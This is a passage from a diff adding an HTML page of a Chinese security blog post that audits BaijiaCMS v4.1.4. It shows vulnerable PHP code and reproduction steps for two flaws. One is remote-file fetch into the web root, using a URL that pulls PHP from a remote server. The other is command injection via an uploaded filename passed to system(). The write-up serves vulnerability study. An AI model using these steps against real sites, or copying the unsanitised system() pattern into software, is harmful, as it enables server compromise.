class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传入url，调用<code>fetch_net_file_upload()</code>函数，跟踪到<code>/includes/baijiacms/common.inc.php</code>(613-616)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_net_file_upload</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$url</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$url</span>);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$extention</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$url</span>,PATHINFO_EXTENSION );</span><br><span class="line">	<span class="variable">$path</span> = <span class="string">&#x27;/attachment/&#x27;</span>;</span><br><span class="line">	<span class="variable">$extpath</span>=<span class="string">&quot;<span class="subst">&#123;$extention&#125;</span>/&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y/m/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">mkdirs</span>(WEB_ROOT . <span class="variable">$path</span> . <span class="variable">$extpath</span>);</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$filename</span> = <span class="title function_ invoke__">random</span>(<span class="number">15</span>) . <span class="string">&quot;.<span class="subst">&#123;$extention&#125;</span>&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span>(<span class="title function_ invoke__">is_file</span>(SYSTEM_WEBROOT . <span class="variable">$path</span> . <span class="variable">$extpath</span>. <span class="variable">$filename</span>));</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$file_tmp_name</span> = SYSTEM_WEBROOT . <span class="variable">$path</span> . <span class="variable">$extpath</span>. <span class="variable">$filename</span>;</span><br><span class="line">		<span class="variable">$file_relative_path</span> = <span class="variable">$extpath</span>. <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file_tmp_name</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>)) == <span class="literal">false</span>) &#123;</span><br><span class="line">		<span class="variable">$result</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="string">&#x27;提取失败.&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br><span class="line">		<span class="variable">$file_full_path</span> = WEB_ROOT .<span class="variable">$path</span> . <span class="variable">$extpath</span>. <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">file_save</span>(<span class="variable">$file_tmp_name</span>,<span class="variable">$filename</span>,<span class="variable">$extention</span>,<span class="variable">$file_full_path</span>,<span class="variable">$file_relative_path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用<code>pathinfo</code>把文件路径以数组形式返回，且只返回extension，即扩展名；<br>路径拼接年月，创建路径；随机数和扩展名拼接为文件名；<br>将读取的文件写入拼接生成的路径下，最后，返回路径信息；</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在远程服务器上建一个test.php，内容是<code>&lt;?php echo &quot;&lt;?php phpinfo();&quot;;</code>；<br>构造url：<br><code>http://127.0.0.1/baijiacms/index.php?mod=web&amp;do=file&amp;m=public&amp;op=fetch&amp;url=http://远程IP/test.php</code><br>访问获得写入的路径；<br><img src="/./images/1608037524235.png" alt="enter description here">[8]<br>访问该路径，写入成功；<br><img src="/./images/1608037598115.png" alt="enter description here">[9]</p>
+<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p><strong>&#x2F;system&#x2F;weixin&#x2F;class&#x2F;web&#x2F;setting.php</strong><br>(20-40)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$extention</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line">		<span class="variable">$extention</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$extention</span>);</span><br><span class="line">  	<span class="keyword">if</span>(<span class="variable">$extention</span>==<span class="string">&#x27;txt&#x27;</span>)</span><br><span class="line">  	&#123;</span><br><span class="line">  		       <span class="variable">$substr</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>], <span class="number">0</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">  		       <span class="keyword">if</span>(<span class="keyword">empty</span>( <span class="variable">$substr</span>))</span><br><span class="line">  		       &#123;</span><br><span class="line">  		        <span class="variable">$substr</span>=<span class="string">&quot;/&quot;</span>;	</span><br><span class="line">  		       &#125;</span><br><span class="line">           <span class="variable">$verify_root</span>= <span class="title function_ invoke__">substr</span>(WEB_ROOT.<span class="string">&quot;/&quot;</span>,<span class="number">0</span>, <span class="title function_ invoke__">strrpos</span>(WEB_ROOT.<span class="string">&quot;/&quot;</span>, <span class="variable">$substr</span>)).<span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">  		<span class="comment">//file_save($file[&#x27;tmp_name&#x27;],$file[&#x27;name&#x27;],$extention,$verify_root.$file[&#x27;name&#x27;],$verify_root.$file[&#x27;name&#x27;],false);</span></span><br><span class="line">  		  		<span class="title function_ invoke__">file_save</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$extention</span>,WEB_ROOT.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],WEB_ROOT.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="literal">false</span>);</span><br><span class="line">  		  		</span><br><span class="line">  		  		<span class="keyword">if</span>(<span class="variable">$verify_root</span>!=WEB_ROOT.<span class="string">&quot;/&quot;</span>)</span><br><span class="line">  		  		&#123;</span><br><span class="line">  		  			<span class="title function_ invoke__">copy</span>(WEB_ROOT.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$verify_root</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">  		  		&#125;</span><br><span class="line">  		  		</span><br><span class="line">  		 <span class="variable">$cfg</span>[<span class="string">&#x27;weixin_hasverify&#x27;</span>]=<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>
+<p>也是<code>pathinfo</code>获取扩展名，进行判断，调用<code>file_save</code>函数，跟踪到<code>/includes/baijiacms/common.inc.pphp</code>(637-655)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_save</span>(<span class="params"><span class="variable">$file_tmp_name</span>,<span class="variable">$filename</span>,<span class="variable">$extention</span>,<span class="variable">$file_full_path</span>,<span class="variable">$file_relative_path</span>,<span class="variable">$allownet</span>=<span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$settings</span>=<span class="title function_ invoke__">globaSystemSetting</span>();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">file_move</span>(<span class="variable">$file_tmp_name</span>, <span class="variable">$file_full_path</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">error</span>(-<span class="number">1</span>, <span class="string">&#x27;保存上传文件失败&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$settings</span>[<span class="string">&#x27;image_compress_openscale&#x27;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="variable">$scal</span>=<span class="variable">$settings</span>[<span class="string">&#x27;image_compress_scale&#x27;</span>];</span><br><span class="line">			<span class="variable">$quality_command</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$scal</span>)&gt;<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$quality_command</span>=<span class="string">&#x27; -quality &#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$scal</span>);</span><br><span class="line">			&#125;</span><br><span class="line">				<span class="title function_ invoke__">system</span>(<span class="string">&#x27;convert&#x27;</span>.<span class="variable">$quality_command</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	.....</span><br><span class="line">	.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$settings[&#39;image_compress_openscale&#39;]</code>即附件设置页面的是否开启图片压缩功能；<br><img src="/./images/1608038939235.png" alt="enter description here">[10]<br>经过判断后，system执行上传的文件，导致RCE；</p>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本地创建一个名称为命令的txt文件；<br><img src="/./images/1608039458796.png" alt="enter description here">[11]<br>找到上传页面进行上传，提交；<br><img src="/./images/1608039628370.png" alt="enter description here">[12]<br>执行成功；<br><img src="/./images/1608039788027.png" alt="enter description here">[13]</p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36197704/article/details/108871698">https://blog.csdn.net/qq_36197704/article/details/108871698</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7542">https://xz.aliyun.com/t/7542</a></p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span>喜欢这篇文章？为什么不考虑打赏一下作者呢？</span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a href="/">John Doe</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://example.com/2022/09/18/%E7%99%BE%E5%AE%B6CMS%20v4.1.4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">http://example.com/2022/09/18/%E7%99%BE%E5%AE%B6CMS%20v4.1.4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    <a href="#top" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+      document.addEventListener('copy', function (event) {
+      const clipboardData = event.clipboardData || window.clipboardData;
+      if (!clipboardData) { return; }
+      const text = window.getSelection().toString();
+      if (text) {
+        event.preventDefault();
+        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
+      }
+    });
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
